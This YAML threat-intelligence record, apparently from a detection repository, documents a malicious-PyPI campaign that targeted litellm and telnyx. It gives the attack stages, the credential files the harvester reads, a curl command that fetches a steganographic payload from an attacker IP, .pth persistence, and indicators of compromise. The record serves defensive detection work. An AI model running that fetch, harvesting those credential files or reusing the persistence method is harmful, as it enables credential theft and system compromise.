name: TeamPCP — Malicious PyPI Package + .pth Persistence
threat_actor: TeamPCP / CanisterWorm
campaign: CanisterWorm PyPI vector
first_seen: 2026-03-19
status: active

summary: >
  TeamPCP published malicious versions of litellm (1.82.7–1.82.8) and telnyx (4.87.1–4.87.2)
  to PyPI. The malicious code ran at import time (no install hooks, evading static scanners)
  and used WAV steganography to deliver a 332-line Python credential harvester covering 30+
  credential categories. The harvester also wrote a .pth file to site-packages to persist
  across all future Python invocations via the site module (T1546.018 — Event Triggered Execution).

attack_chain:
  - stage: 1
    name: Import-time Credential Harvesting
    technique: T1552 (Unsecured Credentials), T1195.001 (Supply Chain — Software Dependencies)
    description: >
      Malicious code injected into telnyx/_client.py runs at import time (no postinstall hook).
      Reads 30+ credential categories: SSH keys, AWS, GCP, Azure, K8s, .env files, database
      configs, crypto wallets, CI/CD secrets, shell histories, /etc/shadow.
    files_targeted:
      - ~/.aws/credentials
      - ~/.aws/config
      - ~/.ssh/id_rsa
      - ~/.ssh/id_ed25519
      - ~/.config/gcloud/application_default_credentials.json
      - ~/.azure/accessTokens.json
      - ~/.npmrc
      - ~/.config/gh/hosts.yml
      - /etc/shadow
      - "**/.env"

  - stage: 2
    name: WAV Steganography Payload Delivery
    technique: T1027 (Obfuscated Files/Information)
    description: >
      Downloads ringtone.wav from http://83.142.209.203:8080/ringtone.wav. XOR-decodes the
      Python payload from audio frames using the first 8 bytes as the XOR key. Executes
      the decoded payload inline. Static scanners see only a WAV download.
    command: "curl -sf http://83.142.209.203:8080/ringtone.wav"

  - stage: 3
    name: .pth File Persistence
    technique: T1546.018 (Event Triggered Execution — Python site module)
    description: >
      Writes litellm_init.pth to site-packages. Python's site module processes .pth files
      on startup — any path entry is added to sys.path; lines starting with 'import ' are
      executed. TeamPCP used this to fire the harvester on every subsequent Python invocation.
    files_created:
      - "~/.local/lib/python*/site-packages/litellm_init.pth"
      - "/usr/lib/python*/dist-packages/litellm_init.pth"

  - stage: 4
    name: Outbound Callback During pip Install
    technique: T1105 (Ingress Tool Transfer), T1195.001
    description: >
      curl or requests callback to C2 during pip install, delivering the second-stage
      payload or exfiltrating credentials. Spawned as a child of the Python import chain.

iocs:
  domains:
    - models.litellm.cloud
    - 83.142.209.203
  files:
    - litellm_init.pth
    - ringtone.wav
    - hangup.wav
  pypi_packages:
    - "litellm==1.82.7"
    - "litellm==1.82.8"
    - "telnyx==4.87.1"
    - "telnyx==4.87.2"
  hashes:
    - a0d229be8efcb2f9135e2ad55ba275b76ddcfeb55fa4370e0a522a5bdee0120b

references:
  - hades/detect/threats/teampcp.yaml
  - hades/writeups/teampcp-checkmarx-supply-chain.md
